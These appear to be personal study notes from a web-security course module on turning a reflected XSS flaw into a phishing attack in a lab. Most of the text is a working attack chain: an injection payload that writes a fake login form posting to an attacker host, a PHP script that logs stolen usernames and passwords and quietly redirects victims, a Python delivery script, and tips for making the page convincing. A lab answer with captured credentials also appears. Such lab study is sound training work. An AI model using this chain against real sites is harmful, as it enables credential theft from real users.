## ID
531

## Module
Cross-Site Scripting (XSS)

## Kind
notes

## Title
Section 7 — XSS Phishing Attack

## Description
Leverages a Reflected XSS vulnerability to inject a fake login form that steals victim credentials via a PHP listener, demonstrating a full phishing attack chain from discovery to credential capture.

## Tags
xss, phishing, reflected-xss, credential-stealing, document.write, social-engineering

## Commands
- curl -s http://<TARGET>/phishing/index.php?url=test1234 | grep test1234
- python xsstrike.py -u "http://<TARGET>/phishing/index.php?url=test"
- sudo php -S 0.0.0.0:<PORT>
- sudo nc -lvnp <PORT>
- cat /tmp/tmpserver/creds.txt

## What This Section Covers
A full XSS-to-phishing attack chain: discover a Reflected XSS in an image viewer app, inject a fake login form via `document.write()`, clean up the page to look legitimate, host a PHP credential stealer, and deliver the malicious URL to a victim via the app's sharing feature. This is a realistic phishing simulation exercise.

## Methodology
1. **Identify the injection point** — view the page source to see how user input renders. In this case `<img src='USER_INPUT'>`, so the URL lands inside single-quoted `src` attribute.
2. **Break out of the HTML context** — use `'>` to close the `src` attribute and `img` tag, then inject your payload: `'><script>alert(1)</script>`.
3. **Build the phishing payload** — use `document.write()` to inject a fake login form that POSTs to your listener:
   ```
   document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP:PORT><input type=username name=username placeholder=Username><input type=password name=password placeholder=Password><input type=submit name=submit value=Login></form>');
   ```
4. **Clean up the page** — remove the original form with `document.getElementById('urlform').remove();` and comment out leftover HTML with `<!--`.
5. **Set up a credential catcher** — create a PHP script that logs GET params to `creds.txt` and redirects the victim back to the real page, then serve it with `sudo php -S 0.0.0.0:PORT`.
6. **Deliver the malicious URL** — submit the full URL through the app's `/phishing/send.php` page (or via `curl`/Python if the form rejects it).
7. **Harvest creds** — read `creds.txt`, then log into `/phishing/login.php` with the stolen credentials.

## Multi-step Workflow
```bash
# 1. Set up credential catcher
mkdir /tmp/tmpserver && cd /tmp/tmpserver
cat > index.php << 'EOF'
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
EOF
sudo php -S 0.0.0.0:81

# 2. In a second terminal — send the phishing URL via Python
cat > /tmp/send.py << 'PYEOF'
import requests, urllib.parse
target = "TARGET_IP"
my_ip  = "ATTACKER_IP"
payload = f"'><script>document.write('<h3>Please login to continue</h3><form action=http://{my_ip}:81><input type=username name=username placeholder=Username><input type=password name=password placeholder=Password><input type=submit name=submit value=Login></form>');document.getElementById('urlform').remove();</script><!--"
encoded = urllib.parse.quote(payload)
full_url = f"http://{target}/phishing/index.php?url={encoded}"
r = requests.post(f"http://{target}/phishing/send.php", data={"url": full_url})
print("[+] Sent!" if "Invalid" not in r.text else "[-] Rejected")
PYEOF
python3 /tmp/send.py

# 3. Check captured creds
cat /tmp/tmpserver/creds.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Obtain the flag | (paste flag here) | Captured creds `admin:p1zd0nt57341myp455` via XSS phishing → logged into `/phishing/login.php` |

## Key Takeaways
- **Always view the source first** — how your input renders determines the breakout sequence. `<img src='INPUT'>` means you need `'>` to escape, not `">` or a bare `<script>` tag.
- **`document.write()` + `document.getElementById().remove()` + `<!--`** is the standard cleanup chain for injecting a convincing fake page via XSS.
- **The PHP listener is superior to netcat** — netcat catches creds but returns an error to the victim, which is suspicious. The PHP script logs creds silently and redirects the victim back to the real page.
- **Port 80 may be in use** — if `php -S 0.0.0.0:80` fails with "Address already in use", use another port (81, 8080, etc.) and update the form action in your payload accordingly.
- **Bash hates `!` in double quotes** — the `!` character triggers bash history expansion. Use Python or single-quoted heredocs to avoid `event not found` errors when building payloads with `document.write()`.
- **send.php may reject raw payloads** — if the app validates URL format, use Python `requests.post()` to submit the URL programmatically and bypass client-side checks.

## Gotchas
- `sudo php -S 0.0.0.0:80` failed because port 80 was already in use by Apache — switched to port 81 and had to update the form action in the XSS payload to match.
- Bash `event not found` error when using `curl -d` with payloads containing `!` — the exclamation mark triggers history expansion in bash. Fixed by using a Python script instead.
- send.php returned "Invalid URL!" when pasting the raw payload — URL-encoding the payload portion via Python's `urllib.parse.quote()` resolved it.
- The form action in the injected HTML **and** the PHP server port must match — easy to forget when you change ports.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|xss]]  
← [[06-defacing]] | [[09-xss-prevention]] →
<!-- AUTO-LINKS-END -->
